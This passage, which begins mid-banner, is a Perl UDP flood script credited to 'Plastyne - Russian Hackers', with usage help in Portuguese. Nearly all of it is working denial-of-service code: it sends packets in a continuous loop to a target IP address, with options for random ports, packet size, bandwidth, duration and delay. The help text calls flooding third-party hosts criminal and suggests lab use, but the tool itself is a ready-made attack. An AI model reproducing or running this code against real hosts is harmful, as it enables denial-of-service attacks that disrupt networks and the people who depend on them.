
od - Coded By Plastyne - Russian Hackers
######################################################

use Socket;
use strict;
use Getopt::Long;
use Time::HiRes qw( usleep gettimeofday ) ;

our $port = 0;
our $size = 0;
our $time = 0;
our $bw   = 0;
our $help = 0;
our $delay= 0;

GetOptions(
	"port=i" => \$port,		# UDP port to use, numeric, 0=random
	"size=i" => \$size,		# packet size, number, 0=random
	"bandwidth=i" => \$bw,		# bandwidth to consume
	"time=i" => \$time,		# time to run
	"delay=f"=> \$delay,		# inter-packet delay
	"help|?" => \$help);		# help
	

my ($ip) = @ARGV;

if ($help || !$ip) {
  print <<'EOL';
flood.pl --port=dst-port --size=pkt-size --time=secs
         --bandwidth=kbps --delay=msec ip-address
_______________________________________________________________________________________________|=>
Padrões:
   * Portas UDP destino aleatório são utilizados a menos que seja especificado --port
   * Pacotes de tamanho aleatório são enviados a menos --size ou --bandwidth é especificado
   * Inundação é contínua, a menos que seja especificado --time
   * Inundação é enviado a uma velocidade de linha, a menos que --delay --bandwidth ou é especificado
_______________________________________________________________________________________________|=>
Recomendações de uso:
   parâmetro --size é ignorado se tanto o --bandwidth eo --delay
     os parâmetros são especificados.
_______________________________________________________________________________________________|=>
   O tamanho de pacote é ajustado para 256 bytes, se o parâmetro é utilizado --bandwidth
     sem o parâmetro --size
_______________________________________________________________________________________________|=>
   O tamanho do pacote especificado é o tamanho do datagrama IP (IP e incluindo
   Cabeçalhos UDP). Tamanhos de pacotes de interface pode variar devido a camada 2 encapsulamento.
_______________________________________________________________________________________________|=>
Avisos e Isenções:
   Inundações hosts ou redes de terceiros é comumente considerada uma atividade criminosa.
   Inundando suas próprias máquinas ou redes geralmente é uma má idéia
   Soluções de inundação Superior performace deve ser usado para testes de esforço / desempenho
   Use principalmente em ambientes de laboratório para testes de DoS
_______________________________________________________________________________________________|=>
EOL
  exit(1);
}

if ($bw && $delay) {
  print "AVISO: calculado tamanho do pacote substitui o parâmetro --size ignorado\n";
  $size = int($bw * $delay / 8);
} elsif ($bw) {
  $delay = (8 * $size) / $bw;
}

$size = 256 if $bw && !$size;

($bw = int($size / $delay * 8)) if ($delay && $size);

my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Não pode resolver o nome do host $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print "Pacotando $ip " . ($port ? $port : "acaso") . " porta com " . 
  ($size ? "$size-byte" : "tamanho aleatório") . " pacotes" . ($time ? " for $time seconds" : "") . "\n";
print "atraso interpacket $delay msec\n" if $delay;
print "total IP bandwidth $bw kbps\n" if $bw;
print "para parar o ataque pressione o Ctrl-C\n" unless $time;

die "Invalid packet size requested: $size\n" if $size && ($size < 64 || $size > 1500);
$size -= 28 if $size;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
  usleep(1000 * $delay) if $delay;
}
